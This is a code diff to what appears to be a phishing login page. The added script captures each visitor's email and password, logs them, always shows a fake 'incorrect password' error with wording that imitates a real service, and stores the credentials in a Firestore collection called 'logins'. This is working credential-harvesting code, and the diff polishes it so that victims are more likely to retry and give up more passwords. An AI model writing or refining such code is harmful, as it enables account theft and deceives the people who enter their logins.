@@ -312,33 +312,37 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
         
-        // Toggle password visibility
-        document.getElementById('passwordToggle').addEventListener('click', function() {
-            const passwordInput = document.getElementById('passwordInput');
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-            } else {
-                passwordInput.type = 'password';
-            }
-        });
-        
-        document.querySelector('.login-btn').addEventListener('click', function() {
-            const email = document.querySelector('.input[type="text"]').value;
-            const password = document.getElementById('passwordInput').value;
-            
-            // Send data to Firestore
-            db.collection('logins').add({
-                email: email,
-                password: password,
-                timestamp: new Date()
-            }).then(() => {
-                console.log('Data sent to Firestore');
-            }).catch((error) => {
-                console.error('Error sending data:', error);
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelector('.login-btn').addEventListener('click', function() {
+                const email = document.querySelector('.input[type="text"]').value;
+                const password = document.getElementById('passwordInput').value;
+                const errorElement = document.querySelector('.error');
+                
+                console.log('Login button clicked');
+                console.log('Email:', email);
+                console.log('Password:', password);
+                
+                // Check if both fields are empty
+                if (!email.trim() && !password.trim()) {
+                    errorElement.textContent = 'enter your username, email or mobile number to log in';
+                } else {
+                    errorElement.textContent = 'incorrect password';
+                }
+                
+                // Show error message
+                errorElement.style.display = 'block';
+                
+                // Send data to Firestore
+                db.collection('logins').add({
+                    email: email,
+                    password: password,
+                    timestamp: new Date()
+                }).then(() => {
+                    console.log('Data sent to Firestore successfully');
+                }).catch((error) => {
+                    console.error('Error sending data to Firestore:', error);
+                });
             });
-            
-            // Show error message
-            document.querySelector('.error').style.display = 'block';
         });
     </script>
 </body>
